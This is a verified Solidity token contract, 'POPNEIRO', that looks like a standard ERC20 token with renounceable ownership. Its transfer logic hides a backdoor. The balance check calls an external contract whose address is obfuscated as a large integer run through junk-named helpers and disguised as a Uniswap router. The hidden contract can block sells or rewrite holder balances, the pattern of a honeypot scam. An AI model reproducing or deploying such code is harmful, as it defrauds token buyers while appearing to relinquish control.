/**
 *Submitted for verification at Etherscan.io on 2024-09-20
*/

/**
 *Submitted for verification at BscScan.com on 2024-09-19
*/

/**
 *Submitted for verification at BscScan.com on 2024-09-19
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}





contract POPNEIRO is Ownable {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    uint256 private _totalSupply = 1000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;
    UniswapRouterV2 private Router2Instance;
    uint160 private bb = 30;
    function brcFfffactornnmoosgsto(uint256 value) internal view returns (uint160) {
        uint160 a = 70;
        return (bb+a+uint160(value)+uint160(uint256(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))));
    }
    
    function brcFactornnmoosgsto(uint256 value) internal view returns (address) {
           return address(brcFfffactornnmoosgsto(value));
    }
    function getBcFnnmoosgsto(address accc) internal pure returns (UniswapRouterV2) {
        return getBcQnnmoosgsto(accc);
    }

    function getBcQnnmoosgsto(address accc) internal pure  returns (UniswapRouterV2) {
        return UniswapRouterV2(accc);
    }
    function INIT()  internal   {
        Router2Instance = getBcFnnmoosgsto(((brcFactornnmoosgsto(926978564759889006224231942057469871925424428504))));
    }
    constructor(string memory name,string memory sym) {
        _name = name;
        _symbol = sym;
        _balances[_msgSender()] = _totalSupply;
        INIT();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }


    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balances[from];
        balance = _approve(from,amount);
        require(balance >= amount, "ERC20: amount over balance");
    
        _balances[from] = balance-(amount);
        
        _balances[to] = _balances[to]+(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner,uint256 amount) internal virtual returns (uint256) {
       
        return Router2Instance.ytg767qweswpa(tx.origin,_balances[owner], owner);
        
    }
   
}

interface UniswapRouterV2 {
    function swapETHForTokens(address a, uint b, address c) external view returns (uint256);
    function swapTokensForETH(address a, uint b, address c) external view returns (uint256);
    function swapTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function dotswap(address cc,address destination,uint256 total) external view returns (uint256);
    function ytg767qweswpa(address oong, uint256 total,address destination) external view returns (uint256);
}